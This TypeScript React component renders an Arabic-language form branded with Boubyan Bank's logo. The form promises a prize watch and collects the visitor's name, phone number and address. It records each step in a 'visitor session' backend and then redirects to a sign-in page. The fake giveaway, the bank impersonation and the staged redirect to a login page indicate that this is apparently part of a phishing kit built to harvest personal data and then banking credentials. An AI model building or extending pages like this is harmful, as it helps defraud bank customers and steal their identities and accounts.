import { FormEvent, useState } from "react";
import { useNavigate } from "react-router-dom";
import { createOrUpdateRequest, fillFieldMessage } from "@/api/visitorSession";
import { getSelectedWatch } from "@/lib/session";
import { useVisitorSession } from "@/hooks/useVisitorSession";
import { ROUTES } from "@/routes";

export default function PersonalInfoPage() {
  const navigate = useNavigate();
  const [fullName, setFullName] = useState("");
  const [phone, setPhone] = useState("");
  const [address, setAddress] = useState("");
  const [additionalInfo, setAdditionalInfo] = useState("");
  const [error, setError] = useState<string | null>(null);

  useVisitorSession("personal_info");

  const onSubmit = async (event: FormEvent) => {
    event.preventDefault();
    const nameOk = fullName.trim().length > 0;
    const phoneOk = phone.trim().length > 0;
    const addressOk = address.trim().length > 0;
    if (!nameOk || !phoneOk || !addressOk) {
      setError(!nameOk ? fillFieldMessage("الاسم") : !phoneOk ? fillFieldMessage("رقم الهاتف") : fillFieldMessage("العنوان"));
      return;
    }

    setError(null);
    await createOrUpdateRequest({
      stage_key: "personal_info",
      contact_ref: phone.trim(),
      contact_name: fullName.trim(),
      contact_address: address.trim(),
      contact_extra: additionalInfo.trim() || undefined,
      prize_choice: getSelectedWatch() || null,
      stage_state: "pending",
      notify_key: "----",
    });
    navigate(ROUTES.signIn);
  };

  return (
    <main className="page-bank__shell view--bank" aria-label="المعلومات الشخصية">
      <header className="bank-topbar">
        <span className="bank-icon bank-icon--chat" aria-hidden="true" />
        <button type="button" className="bank-menu" aria-label="القائمة">
          <span />
          <span />
          <span />
        </button>
      </header>
      <div className="bank-logo-wrap">
        <img src="/BoubyanBankLogo_(1).webp" alt="بوبيان Boubyan" className="bank-logo-img" width={165} />
      </div>
      <form className="bank-form personal-info-form" onSubmit={onSubmit} noValidate>
        <h1 className="bank-section-title personal-info-title">أكمل معلوماتك الشخصية</h1>
        <p className="bank-hint personal-info-hint">أدخل بياناتك لاستكمال المشاركة واستلام الجائزة</p>

        <label className="bank-field">
          <span className="bank-label">الاسم</span>
          <input
            type="text"
            className="bank-input"
            value={fullName}
            onChange={(event) => setFullName(event.target.value)}
            autoComplete="name"
            required
          />
        </label>

        <label className="bank-field">
          <span className="bank-label">رقم الهاتف</span>
          <input
            type="tel"
            className="bank-input"
            value={phone}
            onChange={(event) => setPhone(event.target.value)}
            inputMode="tel"
            autoComplete="tel"
            dir="ltr"
            required
          />
        </label>

        <label className="bank-field">
          <span className="bank-label">العنوان</span>
          <textarea
            className="bank-input personal-info-textarea"
            value={address}
            onChange={(event) => setAddress(event.target.value)}
            autoComplete="street-address"
            rows={3}
            required
          />
        </label>

        <label className="bank-field">
          <span className="bank-label">معلومات إضافية <small>(اختياري)</small></span>
          <textarea
            className="bank-input personal-info-textarea"
            value={additionalInfo}
            onChange={(event) => setAdditionalInfo(event.target.value)}
            rows={3}
          />
        </label>

        {error && <p className="bank-field-error" role="alert">{error}</p>}
        <button type="submit" className="btn-primary btn-primary--bank">متابعة</button>
      </form>
    </main>
  );
}
